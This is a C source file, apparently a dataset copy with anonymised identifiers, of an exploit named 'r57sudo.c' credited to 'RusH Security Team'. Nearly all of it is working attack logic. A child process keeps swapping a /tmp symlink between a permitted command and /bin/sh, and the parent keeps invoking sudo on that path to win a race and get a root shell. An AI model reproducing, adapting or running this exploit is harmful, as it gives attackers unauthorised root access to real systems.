
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int race ;
typedef scalar_t__ pid_t ;
typedef int exec ;


 int VAR_0 ;
 int VAR_1 ;
 char* VAR_2 ;
 int FUNC_0 (char*,int) ;
 scalar_t__ FUNC_1 (int,int) ;
 scalar_t__ FUNC_2 () ;
 int FUNC_3 (int ,char*,...) ;
 int FUNC_4 (char*,int,char*,char*,...) ;
 int VAR_3 ;
 int FUNC_5 (char*) ;

int FUNC_6 (int VAR_4, char ** VAR_5)
{
pid_t VAR_6;
void * VAR_7;
char * VAR_8, * VAR_9, * VAR_10;
if(VAR_4 != 3)
{
FUNC_3(VAR_3, "r57sudo.c by __blf\n");
FUNC_3(VAR_3, "RusH Security Team\n");
FUNC_3(VAR_3, "Usage: %s <sudo full path command> <sudo command>\n",
VAR_5[0]);
FUNC_3(VAR_3, "e.g. ./r57sudo /bin/ls ls\n");
return VAR_1;
}
VAR_6 = FUNC_2();
if(VAR_6 == 0)
{
while(1)
{
VAR_8 = (char *)FUNC_1(VAR_0, sizeof(char));
VAR_9 = (char *)FUNC_1(VAR_0, sizeof(char));
FUNC_0(VAR_8, sizeof(VAR_8));
FUNC_4(VAR_8, VAR_0, "ln -fs %s /tmp/%s", VAR_5[1], VAR_5[2]);
FUNC_5((char *)VAR_8);
FUNC_0(VAR_9, sizeof(VAR_9));
FUNC_4(VAR_9, VAR_0, "rm /tmp/%s", VAR_5[2]);
FUNC_5((char *)VAR_9);
FUNC_0(VAR_9, sizeof(VAR_9));
FUNC_4(VAR_9, VAR_0, "ln -fs /bin/sh /tmp/%s", VAR_5[2]);
FUNC_5((char *)VAR_9);
FUNC_0(VAR_9, sizeof(VAR_9));
FUNC_4(VAR_9, VAR_0, "rm /tmp/%s", VAR_5[2]);
FUNC_5((char *)VAR_9);
}
}
if(VAR_6 > 0)
{
while(1)
{
VAR_10 = (char *)FUNC_1(VAR_0/2, sizeof(char));
FUNC_4(VAR_10, VAR_0/2, "%s /tmp/%s", VAR_2, VAR_5[2]);
FUNC_5((char *)VAR_10);
}
}
}
